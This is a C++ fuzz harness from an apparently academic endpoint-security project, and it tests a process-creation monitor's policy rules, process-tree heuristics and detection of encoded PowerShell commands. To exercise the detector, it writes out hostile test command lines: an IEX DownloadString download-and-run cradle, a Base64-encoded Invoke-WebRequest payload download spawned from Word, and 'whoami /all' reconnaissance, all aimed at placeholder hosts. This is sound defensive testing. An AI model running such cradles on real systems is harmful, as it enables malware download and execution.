// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: https://pvs-studio.com
/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * @file ProcessCommandLineHarness.cpp
 * @brief Implementation of the ProcessCreationMonitor fuzz harness.
 */

#include "ShadowStrike/Fuzzer/Harnesses/ProcessCommandLineHarness.hpp"

#include "PhantomCore/RealTime/ProcessCreationMonitor.hpp"
#include "PhantomCore/Utils/Base64Utils.hpp"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>

#include <algorithm>
#include <array>
#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <exception>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <optional>
#include <span>
#include <string>
#include <string_view>
#include <vector>

namespace SSF = ShadowStrike::Fuzzer;
namespace SSRT = ShadowStrike::RealTime;
namespace SSU = ShadowStrike::Utils;

namespace {

constexpr uint8_t kLaneMask = 0x01;
constexpr uint8_t kLaneLifecyclePolicy = 0;
constexpr uint8_t kLaneGraphAnalysis = 1;
constexpr uint32_t kPidBase = 4000;

thread_local std::vector<uint64_t> g_createCallbackIds;
thread_local std::vector<uint64_t> g_terminateCallbackIds;
thread_local std::vector<uint64_t> g_suspiciousCallbackIds;
thread_local std::string g_processCleanupIssue;

SRWLOCK& HarnessLock() noexcept {
    static SRWLOCK lock = SRWLOCK_INIT;
    return lock;
}

class ScopedHarnessLock {
public:
    ScopedHarnessLock() noexcept {
        AcquireSRWLockExclusive(&HarnessLock());
    }

    ~ScopedHarnessLock() {
        ReleaseSRWLockExclusive(&HarnessLock());
    }
};

void CaptureFirstIssue(SSF::HarnessResult& result, std::string_view message) {
    if (result.errorMessage.empty()) {
        result.errorMessage.assign(message.begin(), message.end());
    }
}

void RecordValidationIssue(SSF::HarnessResult& result, std::string_view message) {
    ++result.validationIssueCount;
    CaptureFirstIssue(result, message);
}

void RecordAnomaly(SSF::HarnessResult& result, std::string_view message) {
    ++result.anomalyCount;
    CaptureFirstIssue(result, message);
}

[[nodiscard]] std::string ExceptionCodeToStringInternal(DWORD code) {
    switch (code) {
    case EXCEPTION_ACCESS_VIOLATION:         return "EXCEPTION_ACCESS_VIOLATION";
    case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:    return "EXCEPTION_ARRAY_BOUNDS_EXCEEDED";
    case EXCEPTION_BREAKPOINT:               return "EXCEPTION_BREAKPOINT";
    case EXCEPTION_DATATYPE_MISALIGNMENT:    return "EXCEPTION_DATATYPE_MISALIGNMENT";
    case EXCEPTION_FLT_DENORMAL_OPERAND:     return "EXCEPTION_FLT_DENORMAL_OPERAND";
    case EXCEPTION_FLT_DIVIDE_BY_ZERO:       return "EXCEPTION_FLT_DIVIDE_BY_ZERO";
    case EXCEPTION_FLT_INEXACT_RESULT:       return "EXCEPTION_FLT_INEXACT_RESULT";
    case EXCEPTION_FLT_INVALID_OPERATION:    return "EXCEPTION_FLT_INVALID_OPERATION";
    case EXCEPTION_FLT_OVERFLOW:             return "EXCEPTION_FLT_OVERFLOW";
    case EXCEPTION_FLT_STACK_CHECK:          return "EXCEPTION_FLT_STACK_CHECK";
    case EXCEPTION_FLT_UNDERFLOW:            return "EXCEPTION_FLT_UNDERFLOW";
    case EXCEPTION_GUARD_PAGE:               return "EXCEPTION_GUARD_PAGE";
    case EXCEPTION_ILLEGAL_INSTRUCTION:      return "EXCEPTION_ILLEGAL_INSTRUCTION";
    case EXCEPTION_IN_PAGE_ERROR:            return "EXCEPTION_IN_PAGE_ERROR";
    case EXCEPTION_INT_DIVIDE_BY_ZERO:       return "EXCEPTION_INT_DIVIDE_BY_ZERO";
    case EXCEPTION_INT_OVERFLOW:             return "EXCEPTION_INT_OVERFLOW";
    case EXCEPTION_INVALID_DISPOSITION:      return "EXCEPTION_INVALID_DISPOSITION";
    case EXCEPTION_NONCONTINUABLE_EXCEPTION: return "EXCEPTION_NONCONTINUABLE_EXCEPTION";
    case EXCEPTION_PRIV_INSTRUCTION:         return "EXCEPTION_PRIV_INSTRUCTION";
    case EXCEPTION_SINGLE_STEP:              return "EXCEPTION_SINGLE_STEP";
    case EXCEPTION_STACK_OVERFLOW:           return "EXCEPTION_STACK_OVERFLOW";
    case STATUS_HEAP_CORRUPTION:             return "STATUS_HEAP_CORRUPTION";
    default: {
        char buffer[32]{};
        std::snprintf(buffer, sizeof(buffer), "EXCEPTION_0x%08lX", code);
        return buffer;
    }
    }
}

[[nodiscard]] uint32_t ReadLe32(std::span<const uint8_t> payload, size_t offset, uint32_t fallback) noexcept {
    if (offset >= payload.size()) {
        return fallback;
    }

    uint32_t value = 0;
    const size_t available = std::min(sizeof(value), payload.size() - offset);
    std::memcpy(&value, payload.data() + offset, available);
    return value;
}

[[nodiscard]] std::span<const uint8_t> TailBytes(
    const std::span<const uint8_t> input,
    const size_t offset) noexcept
{
    if (offset >= input.size()) {
        return {};
    }

    return input.subspan(offset);
}

[[nodiscard]] std::string MakeAsciiToken(std::span<const uint8_t> payload, std::string_view fallback = "proc") {
    std::string value;
    value.reserve(std::min<size_t>(payload.size(), 24));

    for (const uint8_t byte : payload) {
        const char ch = static_cast<char>(byte & 0x7F);
        if ((ch >= 'a' && ch <= 'z') ||
            (ch >= 'A' && ch <= 'Z') ||
            (ch >= '0' && ch <= '9')) {
            value.push_back(static_cast<char>(std::tolower(static_cast<unsigned char>(ch))));
        } else if (ch == '-' || ch == '_') {
            value.push_back(ch == '_' ? '-' : ch);
        }

        if (value.size() == 24) {
            break;
        }
    }

    if (value.empty()) {
        value.assign(fallback.begin(), fallback.end());
    }

    if (value.front() == '-') {
        value.front() = 'a';
    }
    if (value.back() == '-') {
        value.back() = 'z';
    }

    return value;
}

[[nodiscard]] std::wstring MakeWideToken(std::span<const uint8_t> payload, std::wstring_view fallback = L"proc") {
    const std::string narrow = MakeAsciiToken(payload, std::string(fallback.begin(), fallback.end()));
    return std::wstring(narrow.begin(), narrow.end());
}

[[nodiscard]] std::string MakeHashToken(std::span<const uint8_t> payload, uint32_t salt) {
    static constexpr char kHex[] = "0123456789abcdef";

    std::string token(64, '0');
    for (size_t i = 0; i < token.size() / 2; ++i) {
        const uint8_t source = payload.empty()
            ? static_cast<uint8_t>((salt + static_cast<uint32_t>(i)) & 0xFFu)
            : payload[i % payload.size()];
        const uint8_t mixed = static_cast<uint8_t>(source ^ static_cast<uint8_t>((salt >> ((i % 4u) * 8u)) & 0xFFu) ^ static_cast<uint8_t>(i * 17u));
        token[(i * 2)] = kHex[(mixed >> 4) & 0x0F];
        token[(i * 2) + 1] = kHex[mixed & 0x0F];
    }
    return token;
}

[[nodiscard]] std::wstring BuildImagePath(
    std::wstring_view imageName,
    std::wstring_view token,
    bool tempPath,
    bool networkPath)
{
    if (networkPath) {
        std::wstring path = L"\\\\shadowstrike-fuzz\\share\\";
        path.append(token);
        path.push_back(L'\\');
        path.append(imageName);
        return path;
    }

    if (tempPath) {
        std::wstring path = L"C:\\Users\\Public\\AppData\\Local\\Temp\\";
        path.append(token);
        path.push_back(L'\\');
        path.append(imageName);
        return path;
    }

    if (_wcsicmp(imageName.data(), L"powershell.exe") == 0) {
        return L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    }
    if (_wcsicmp(imageName.data(), L"cmd.exe") == 0) {
        return L"C:\\Windows\\System32\\cmd.exe";
    }
    if (_wcsicmp(imageName.data(), L"winword.exe") == 0) {
        return L"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
    }

    std::wstring path = L"C:\\Program Files\\";
    path.append(token);
    path.push_back(L'\\');
    path.append(imageName);
    return path;
}

[[nodiscard]] std::wstring EncodeUtf16Base64(std::wstring_view text) {
    std::vector<uint8_t> bytes(text.size() * sizeof(wchar_t));
    if (!bytes.empty()) {
        std::memcpy(bytes.data(), text.data(), bytes.size());
    }

    std::string encoded;
    if (!SSU::Base64Encode(bytes, encoded)) {
        return {};
    }

    return std::wstring(encoded.begin(), encoded.end());
}

[[nodiscard]] std::wstring BuildEncodedPowerShellCommand(std::span<const uint8_t> payload) {
    const std::wstring token = MakeWideToken(payload, L"shadow");
    std::wstring script = L"Invoke-WebRequest https://";
    script.append(token);
    script.append(L".example/payload.exe -OutFile C:\\Users\\Public\\");
    script.append(token);
    script.append(L".exe");

    const std::wstring encoded = EncodeUtf16Base64(script);
    std::wstring command = L"powershell.exe -NoProfile -EncodedCommand ";
    command.append(encoded);
    return command;
}

[[nodiscard]] SSRT::ProcessMonitorConfig BuildMonitorConfig(bool analysisLane, uint8_t flags) {
    SSRT::ProcessMonitorConfig config = SSRT::ProcessMonitorConfig::CreateMonitorOnly();
    config.enabled = true;
    config.analyzeCommandLine = true;
    config.trackParentChild = true;
    config.buildProcessTree = true;
    config.detectLOLBAS = true;
    config.detectSuspiciousParentChild = true;
    config.detectEncodedCommands = true;
    config.detectMasquerading = ((flags & 0x04u) == 0u);
    config.alertThreshold = analysisLane ? 1.0 : 25.0;
    config.blockThreshold = 250.0;
    config.maxTrackedProcesses = 256;
    return config;
}

[[nodiscard]] SSRT::ProcessCreateEvent BuildEvent(
    const uint32_t pid,
    const uint32_t parentPid,
    const std::wstring& imageName,
    const std::wstring& commandLine,
    std::span<const uint8_t> payload,
    const uint8_t flags,
    const bool imageSigned,
    const bool tempPath,
    const bool networkPath)
{
    SSRT::ProcessCreateEvent event{};
    const std::wstring token = MakeWideToken(payload, L"shadow");

    event.eventId = (static_cast<uint64_t>(parentPid) << 32) | pid;
    event.timestamp = std::chrono::system_clock::now();
    event.processId = pid;
    event.parentProcessId = parentPid;
    event.creatingThreadId = pid + 1;
    event.sessionId = 1u + (flags & 0x03u);
    event.imagePath = BuildImagePath(imageName, token, tempPath, networkPath);
    event.imageFileName = imageName;
    event.commandLine = commandLine;
    event.currentDirectory = tempPath ? L"C:\\Users\\Public\\AppData\\Local\\Temp" : L"C:\\Users\\Public";
    event.userSid = L"S-1-5-21-424242-1000";
    event.userName = ((flags & 0x08u) != 0u) ? L"shadow-admin" : L"shadow-user";
    event.elevationType = ((flags & 0x08u) != 0u) ? 2u : 1u;
    event.isElevated = ((flags & 0x08u) != 0u);
    event.integrityLevel = event.isElevated ? 0x3000u : 0x2000u;
    event.isImageSigned = imageSigned;
    event.imageSigner = imageSigned ? L"Microsoft Windows" : L"";
    event.imageHash = MakeHashToken(payload, pid);
    event.imageSize = 16384u + payload.size();
    event.isWoW64 = ((flags & 0x10u) != 0u);
    event.isProtectedProcess = false;
    event.subsystem = 2u;
    event.characteristics = 0x2022u;
    event.isNetworkImage = networkPath;
    event.isRemovableMedia = false;
    event.requiresVerdict = true;
    return event;
}

[[nodiscard]] SSRT::ProcessPolicyRule BuildRule(
    std::string_view ruleId,
    std::wstring_view ruleName,
    const SSRT::ProcessVerdict action,
    const uint32_t priority)
{
    SSRT::ProcessPolicyRule rule{};
    rule.ruleId.assign(ruleId.begin(), ruleId.end());
    rule.name.assign(ruleName.begin(), ruleName.end());
    rule.description = rule.name;
    rule.action = action;
    rule.priority = priority;
    rule.enabled = true;
    rule.created = std::chrono::system_clock::now();
    return rule;
}

void CleanupIterationState() noexcept {
    g_processCleanupIssue.clear();

    auto& monitor = SSRT::ProcessCreationMonitor::Instance();
    auto noteFailure = [](std::string_view message) {
        if (g_processCleanupIssue.empty()) {
            g_processCleanupIssue.assign(message.begin(), message.end());
        }
    };

    for (const uint64_t callbackId : g_createCallbackIds) {
        try {
            if (!monitor.UnregisterCreateCallback(callbackId)) {
                noteFailure("process-command-line cleanup failed to unregister create callback");
            }
        } catch (...) {
            noteFailure("process-command-line cleanup threw while unregistering create callback");
        }
    }
    g_createCallbackIds.clear();

    for (const uint64_t callbackId : g_terminateCallbackIds) {
        try {
            if (!monitor.UnregisterTerminateCallback(callbackId)) {
                noteFailure("process-command-line cleanup failed to unregister terminate callback");
            }
        } catch (...) {
            noteFailure("process-command-line cleanup threw while unregistering terminate callback");
        }
    }
    g_terminateCallbackIds.clear();

    for (const uint64_t callbackId : g_suspiciousCallbackIds) {
        try {
            if (!monitor.UnregisterSuspiciousCallback(callbackId)) {
                noteFailure("process-command-line cleanup failed to unregister suspicious callback");
            }
        } catch (...) {
            noteFailure("process-command-line cleanup threw while unregistering suspicious callback");
        }
    }
    g_suspiciousCallbackIds.clear();

    try {
        const auto rules = monitor.GetRules();
        for (const auto& rule : rules) {
            if (!rule.ruleId.empty()) {
                (void)monitor.RemoveRule(rule.ruleId);
            }
        }
    } catch (...) {
        noteFailure("process-command-line cleanup threw while removing rules");
    }

    try {
        monitor.SetScanEngine(nullptr);
        monitor.SetThreatDetector(nullptr);
        monitor.SetBehaviorAnalyzer(nullptr);
        monitor.SetWhitelistStore(nullptr);
        monitor.SetHashStore(nullptr);
        monitor.SetThreatIntelIndex(nullptr);
        monitor.Stop();
        monitor.Shutdown();
    } catch (...) {
        noteFailure("process-command-line cleanup threw while shutting down monitor");
    }
}

void RegisterDeterministicCallbacks(
    std::atomic<uint64_t>& createCount,
    std::atomic<uint64_t>& terminateCount,
    std::atomic<uint64_t>& suspiciousCount)
{
    auto& monitor = SSRT::ProcessCreationMonitor::Instance();
    g_createCallbackIds.push_back(monitor.RegisterCreateCallback(
        [&createCount](const SSRT::ProcessCreateEvent&) {
            createCount.fetch_add(1, std::memory_order_relaxed);
            return SSRT::ProcessVerdict::Allow;
        }));
    g_terminateCallbackIds.push_back(monitor.RegisterTerminateCallback(
        [&terminateCount](uint32_t, uint32_t) {
            terminateCount.fetch_add(1, std::memory_order_relaxed);
        }));
    g_suspiciousCallbackIds.push_back(monitor.RegisterSuspiciousCallback(
        [&suspiciousCount](const SSRT::ProcessInfo&, const std::vector<SSRT::SuspiciousPattern>&) {
            suspiciousCount.fetch_add(1, std::memory_order_relaxed);
        }));
}

void ExerciseLifecyclePolicyLane(
    std::span<const uint8_t> payload,
    const uint8_t flags,
    SSF::HarnessResult& result)
{
    auto& monitor = SSRT::ProcessCreationMonitor::Instance();
    const SSRT::ProcessMonitorConfig config = BuildMonitorConfig(false, flags);

    if (!monitor.Initialize(nullptr, config)) {
        RecordValidationIssue(result, "ProcessCreationMonitor initialization failed");
        return;
    }

    monitor.UpdateConfig(config);
    const auto configSnapshot = monitor.GetConfig();
    if (configSnapshot.blockThreshold != config.blockThreshold ||
        configSnapshot.alertThreshold != config.alertThreshold) {
        RecordValidationIssue(result, "ProcessCreationMonitor configuration snapshot mismatch");
    }

    monitor.Start();
    if (!monitor.IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not enter running state");
    }

    monitor.Pause();
    if (monitor.IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor pause did not clear running state");
    }

    monitor.Resume();
    if (!monitor.IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor resume did not restore running state");
    }

    monitor.ResetStats();

    std::atomic<uint64_t> createCount{0};
    std::atomic<uint64_t> terminateCount{0};
    std::atomic<uint64_t> suspiciousCount{0};
    RegisterDeterministicCallbacks(createCount, terminateCount, suspiciousCount);

    const std::string token = MakeAsciiToken(payload, "policy");
    const std::string allowHash = MakeHashToken(TailBytes(payload, 4), kPidBase + 2u);

    auto blockRule = BuildRule("pcm-block-" + token, L"Block downloadstring", SSRT::ProcessVerdict::Block, 200);
    blockRule.commandLinePattern = L"downloadstring";
    auto allowRule = BuildRule("pcm-allow-" + token, L"Allow deterministic hash", SSRT::ProcessVerdict::Allow, 100);
    allowRule.imageHash = allowHash;

    (void)monitor.AddRule(blockRule);
    (void)monitor.AddRule(allowRule);

    const auto rules = monitor.GetRules();
    if (rules.size() < 2) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not retain added rules");
    } else if (rules.front().ruleId != blockRule.ruleId) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not sort rules by priority");
    }

    const auto blockEvent = BuildEvent(
        kPidBase + 1u,
        3200u,
        L"powershell.exe",
        L"powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('https://blocked.example/a.ps1')",
        payload,
        flags,
        false,
        false,
        false);

    const SSRT::ProcessVerdict blockVerdict = monitor.OnProcessCreate(blockEvent);
    if (blockVerdict != SSRT::ProcessVerdict::Block) {
        RecordValidationIssue(result, "ProcessCreationMonitor block rule did not produce a block verdict");
    }

    monitor.SetRuleEnabled(blockRule.ruleId, false);

    auto allowEvent = BuildEvent(
        kPidBase + 2u,
        3200u,
        L"powershell.exe",
        L"powershell.exe -NoProfile -Command Write-Host shadowstrike",
        TailBytes(payload, 2),
        flags,
        true,
        false,
        false);
    allowEvent.imageHash = allowHash;

    const SSRT::ProcessVerdict allowVerdict = monitor.OnProcessCreate(allowEvent);
    if (allowVerdict != SSRT::ProcessVerdict::Allow) {
        RecordValidationIssue(result, "ProcessCreationMonitor allow rule did not produce an allow verdict");
    }

    const auto processInfo = monitor.GetProcessInfo(allowEvent.processId);
    if (!processInfo.has_value()) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not retain allowed process state");
    } else if (processInfo->imageName != allowEvent.imageFileName) {
        RecordValidationIssue(result, "ProcessCreationMonitor stored incorrect image name");
    }

    if (monitor.GetProcessesByUser(allowEvent.userName).empty()) {
        RecordValidationIssue(result, "ProcessCreationMonitor user query did not return allowed process");
    }
    if (monitor.GetProcessesByImage(allowEvent.imageFileName).empty()) {
        RecordValidationIssue(result, "ProcessCreationMonitor image query did not return allowed process");
    }

    const auto callbackEvent = BuildEvent(
        kPidBase + 3u,
        3200u,
        L"cmd.exe",
        L"cmd.exe /c echo shadowstrike",
        TailBytes(payload, 6),
        flags,
        true,
        false,
        false);

    const SSRT::ProcessVerdict callbackVerdict = monitor.OnProcessCreate(callbackEvent);
    if (callbackVerdict != SSRT::ProcessVerdict::Allow) {
        RecordValidationIssue(result, "ProcessCreationMonitor benign callback event did not produce allow verdict");
    }

    const auto stats = monitor.GetStats();
    if (stats.totalProcessCreations < 3 || stats.processesBlocked < 1 || stats.processesAllowed < 2) {
        RecordValidationIssue(result, "ProcessCreationMonitor statistics did not capture lifecycle policy events");
    }

    if (createCount.load(std::memory_order_relaxed) == 0) {
        RecordValidationIssue(result, "ProcessCreationMonitor create callback did not fire");
    }

    monitor.OnProcessTerminate(allowEvent.processId, 0x42u);

    if (terminateCount.load(std::memory_order_relaxed) == 0) {
        RecordValidationIssue(result, "ProcessCreationMonitor terminate callback did not fire");
    }

    const auto terminatedInfo = monitor.GetProcessInfo(allowEvent.processId);
    if (!terminatedInfo.has_value() || terminatedInfo->IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor termination state did not persist");
    }

    monitor.Stop();
    if (monitor.IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor stop did not clear running state");
    }

    if (suspiciousCount.load(std::memory_order_relaxed) > 1u) {
        RecordAnomaly(result, "ProcessCreationMonitor reported unexpected suspicious callbacks in policy lane");
    }
}

void ExerciseGraphAnalysisLane(
    std::span<const uint8_t> payload,
    const uint8_t flags,
    SSF::HarnessResult& result)
{
    auto& monitor = SSRT::ProcessCreationMonitor::Instance();
    const SSRT::ProcessMonitorConfig config = BuildMonitorConfig(true, flags);

    if (!monitor.Initialize(nullptr, config)) {
        RecordValidationIssue(result, "ProcessCreationMonitor initialization failed");
        return;
    }

    monitor.Start();
    if (!monitor.IsRunning()) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not enter running state");
    }

    monitor.ResetStats();

    std::atomic<uint64_t> createCount{0};
    std::atomic<uint64_t> terminateCount{0};
    std::atomic<uint64_t> suspiciousCount{0};
    RegisterDeterministicCallbacks(createCount, terminateCount, suspiciousCount);

    const auto parentEvent = BuildEvent(
        kPidBase + 10u,
        4u,
        L"winword.exe",
        L"WINWORD.EXE C:\\Users\\Public\\invoice.docm",
        payload,
        flags,
        true,
        false,
        false);

    const SSRT::ProcessVerdict parentVerdict = monitor.OnProcessCreate(parentEvent);
    if (parentVerdict != SSRT::ProcessVerdict::Allow) {
        RecordValidationIssue(result, "ProcessCreationMonitor parent event did not produce allow verdict");
    }

    const std::wstring encodedCommand = BuildEncodedPowerShellCommand(TailBytes(payload, 3));
    auto childEvent = BuildEvent(
        kPidBase + 11u,
        parentEvent.processId,
        L"powershell.exe",
        encodedCommand,
        TailBytes(payload, 1),
        flags,
        true,
        false,
        false);

    const SSRT::ProcessVerdict childVerdict = monitor.OnProcessCreate(childEvent);
    if (childVerdict != SSRT::ProcessVerdict::AllowMonitored) {
        RecordValidationIssue(result, "ProcessCreationMonitor did not monitor suspicious PowerShell command line");
    }

    auto grandchildEvent = BuildEvent(
        kPidBase + 12u,
        childEvent.processId,
        L"cmd.exe",
        L"cmd.exe /c whoami ^^^^ /all",
        TailBytes(payload, 5),
        flags,
        true,
        false,
        false);

    const SSRT::ProcessVerdict grandchildVerdict = monitor.OnProcessCreate(grandchildEvent);
    if (grandchildVerdict == SSRT::ProcessVerdict::Block) {
        RecordValidationIssue(result, "ProcessCreationMonitor unexpectedly blocked command-shell descendant");
    }

    const auto childInfo = monitor.GetProcessInfo(childEvent.processId);
    const auto parentInfo = monitor.GetParentProcess(childEvent.processId);
    if (!childInfo.has_value() || !parentInfo.has_value()) {
        RecordValidationIssue(result, "ProcessCreationMonitor parent-child query failed");
    } else {
        const auto suspiciousPatterns = monitor.CheckParentChild(*parentInfo, *childInfo);
        if (suspiciousPatterns.empty()) {
            RecordValidationIssue(result, "ProcessCreationMonitor parent-child heuristic did not surface suspicious pattern");
        }

        if (monitor.ClassifyProcessType(*parentInfo) != SSRT::ProcessType::Office) {
            RecordValidationIssue(result, "ProcessCreationMonitor misclassified Office parent process");
        }
    }

    const auto children = monitor.GetChildProcesses(parentEvent.processId);
    const auto childIt = std::find_if(
        children.begin(),
        children.end(),
        [childPid = childEvent.processId](const SSRT::ProcessInfo& info) { return info.processId == childPid; });
    if (childIt == children.end()) {
        RecordValidationIssue(result, "ProcessCreationMonitor child-process query missed PowerShell child");
    }

    const auto ancestors = monitor.GetAncestorChain(grandchildEvent.processId);
    if (ancestors.size() < 2) {
        RecordValidationIssue(result, "ProcessCreationMonitor ancestor chain was incomplete");
    }

    const auto tree = monitor.GetProcessTree(grandchildEvent.processId);
    if (!tree.has_value() || tree->depth < 2 || tree->GetProcessChainString().empty()) {
        RecordValidationIssue(result, "ProcessCreationMonitor process tree metadata was incomplete");
    }

    const auto analysis = monitor.AnalyzeCommandLine(childEvent.commandLine);
    if (!analysis.hasEncodedContent || analysis.patterns.empty() || analysis.riskScore <= 0.0) {
        RecordValidationIssue(result, "ProcessCreationMonitor command-line analysis missed encoded PowerShell indicators");
    }

    const std::wstring encodedArgument =
        childEvent.commandLine.substr(childEvent.commandLine.find_last_of(L' ') + 1);
    const std::wstring decoded = monitor.DecodeEncodedContent(encodedArgument);
    if (decoded.find(L"Invoke-WebRequest") == std::wstring::npos) {
        RecordValidationIssue(result, "ProcessCreationMonitor encoded-command decoder did not recover PowerShell payload");
    }

    if (!monitor.IsCommandLineSuspicious(childEvent.commandLine)) {
        RecordValidationIssue(result, "ProcessCreationMonitor suspicious command-line predicate returned false");
    }

    if (monitor.ClassifyLOLBAS(childEvent.imageFileName) != SSRT::LOLBASType::PowerShell) {
        RecordValidationIssue(result, "ProcessCreationMonitor misclassified PowerShell LOLBAS type");
    }

    const auto stats = monitor.GetStats();
    if (stats.totalProcessCreations < 3 ||
        stats.parentChildDetections == 0 ||
        stats.encodedCommandDetections == 0 ||
        stats.processesSuspicious == 0) {
        RecordValidationIssue(result, "ProcessCreationMonitor statistics did not capture graph-analysis activity");
    }

    if (createCount.load(std::memory_order_relaxed) < 3) {
        RecordValidationIssue(result, "ProcessCreationMonitor create callbacks missed graph-analysis events");
    }
    if (suspiciousCount.load(std::memory_order_relaxed) == 0) {
        RecordValidationIssue(result, "ProcessCreationMonitor suspicious callback did not fire");
    }

    monitor.OnProcessTerminate(grandchildEvent.processId, 0u);
    monitor.OnProcessTerminate(childEvent.processId, 0u);
    if (terminateCount.load(std::memory_order_relaxed) < 2) {
        RecordValidationIssue(result, "ProcessCreationMonitor terminate callbacks missed descendant shutdown");
    }
}

[[nodiscard]] bool ExerciseProcessCommandLineInput(
    std::span<const uint8_t> input,
    SSF::HarnessResult& result)
{
    if (input.empty()) {
        result.errorMessage = "process-command-line input too small";
        return false;
    }

    const uint8_t lane = input[0] & kLaneMask;
    const uint8_t flags = (input.size() > 1) ? input[1] : 0u;
    const std::span<const uint8_t> payload = TailBytes(input, std::min<size_t>(input.size(), 2));

    CleanupIterationState();

    switch (lane) {
    case kLaneLifecyclePolicy:
        ExerciseLifecyclePolicyLane(payload, flags, result);
        break;
    case kLaneGraphAnalysis:
        ExerciseGraphAnalysisLane(payload, flags, result);
        break;
    default:
        result.errorMessage = "invalid process-command-line lane";
        return false;
    }

    result.parsedOk = (result.validationIssueCount == 0);
    return result.parsedOk;
}

void EnsureSeedCorpus(const std::filesystem::path& corpusDir) {
    const std::array<std::pair<std::string_view, std::vector<uint8_t>>, 2> seeds{{
        { "seed-process-policy.bin", { kLaneLifecyclePolicy, 0x08, 'p', 'o', 'l', 'i', 'c', 'y' } },
        { "seed-process-graph.bin", { kLaneGraphAnalysis, 0x00, 'g', 'r', 'a', 'p', 'h' } },
    }};

    for (const auto& [name, bytes] : seeds) {
        const std::filesystem::path seedPath = corpusDir / name;
        if (std::filesystem::exists(seedPath)) {
            continue;
        }

        std::ofstream stream(seedPath, std::ios::binary | std::ios::trunc);
        if (!stream) {
            continue;
        }

        stream.write(reinterpret_cast<const char*>(bytes.data()), static_cast<std::streamsize>(bytes.size()));
    }
}

[[nodiscard]] std::optional<std::vector<uint8_t>> ReadFileBytes(const std::filesystem::path& path) {
    std::ifstream stream(path, std::ios::binary);
    if (!stream) {
        return std::nullopt;
    }

    stream.seekg(0, std::ios::end);
    const std::streamoff size = stream.tellg();
    if (size < 0) {
        return std::nullopt;
    }

    stream.seekg(0, std::ios::beg);
    std::vector<uint8_t> bytes(static_cast<size_t>(size));
    if (!bytes.empty()) {
        stream.read(reinterpret_cast<char*>(bytes.data()), size);
        if (!stream) {
            return std::nullopt;
        }
    }

    return bytes;
}

}  // namespace

namespace ShadowStrike::Fuzzer {

unsigned long ProcessCommandLineHarness::SEHCallProcessCommandLine(
    const uint8_t* data,
    size_t size,
    HarnessResult* result) noexcept
{
    __try {
        ExerciseProcessCommandLineImpl(data, size, *result);
        return static_cast<unsigned long>(EXCEPTION_CONTINUE_EXECUTION);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return static_cast<unsigned long>(GetExceptionCode());
    }
}

bool ProcessCommandLineHarness::ExerciseProcessCommandLineImpl(
    const uint8_t* data,
    size_t size,
    HarnessResult& result)
{
    return ExerciseProcessCommandLineInput(std::span<const uint8_t>(data, size), result);
}

HarnessResult ProcessCommandLineHarness::Run(std::span<const uint8_t> input) noexcept {
    HarnessResult result{};
    ScopedHarnessLock harnessLock;

    try {
        if (input.empty()) {
            result.errorMessage = "process-command-line input is empty";
            return result;
        }

        const unsigned long sehCode = SEHCallProcessCommandLine(input.data(), input.size(), &result);
        CleanupIterationState();

        if (!g_processCleanupIssue.empty()) {
            RecordAnomaly(result, g_processCleanupIssue);
        }

        if (sehCode != EXCEPTION_CONTINUE_EXECUTION) {
            result.crashed = true;
            result.crashSignal = ExceptionCodeToString(sehCode);
            if (result.errorMessage.empty()) {
                result.errorMessage = "process-command-line harness raised a structured exception";
            }
            return result;
        }

        if (result.validationIssueCount != 0) {
            result.parsedOk = false;
        }
    } catch (const std::exception& ex) {
        CleanupIterationState();
        if (!g_processCleanupIssue.empty()) {
            RecordAnomaly(result, g_processCleanupIssue);
        }
        result.crashed = true;
        result.crashSignal = "CPP_EXCEPTION";
        result.errorMessage = ex.what();
    } catch (...) {
        CleanupIterationState();
        if (!g_processCleanupIssue.empty()) {
            RecordAnomaly(result, g_processCleanupIssue);
        }
        result.crashed = true;
        result.crashSignal = "CPP_UNKNOWN_EXCEPTION";
    }

    return result;
}

HarnessFunction ProcessCommandLineHarness::GetHarnessFunction() noexcept {
    return &ProcessCommandLineHarness::Run;
}

std::string_view ProcessCommandLineHarness::GetName() noexcept {
    return "process-command-line";
}

std::string_view ProcessCommandLineHarness::GetDescription() noexcept {
    return "Exercises ProcessCreationMonitor command-line, rule, and genealogy paths.";
}

std::string ProcessCommandLineHarness::ExceptionCodeToString(unsigned long code) {
    return ExceptionCodeToStringInternal(code);
}

int RunProcessCommandLineFuzzer(
    const std::filesystem::path& workspaceDir,
    const FuzzLoopConfig& config) noexcept
{
    if (!InstallCtrlCHandler()) {
        std::cerr << "[ProcessCmdLineFuzzer] Warning: Failed to install Ctrl+C handler\n";
    }

    const std::filesystem::path corpusDir = workspaceDir / "corpora" / "process-command-line";
    const std::filesystem::path crashDir = workspaceDir / "crashes" / "process-command-line";

    std::error_code error;
    std::filesystem::create_directories(corpusDir, error);
    if (error) {
        std::cerr << "[ProcessCmdLineFuzzer] Failed to create corpus directory: " << corpusDir << '\n';
        return 1;
    }

    error.clear();
    std::filesystem::create_directories(crashDir, error);
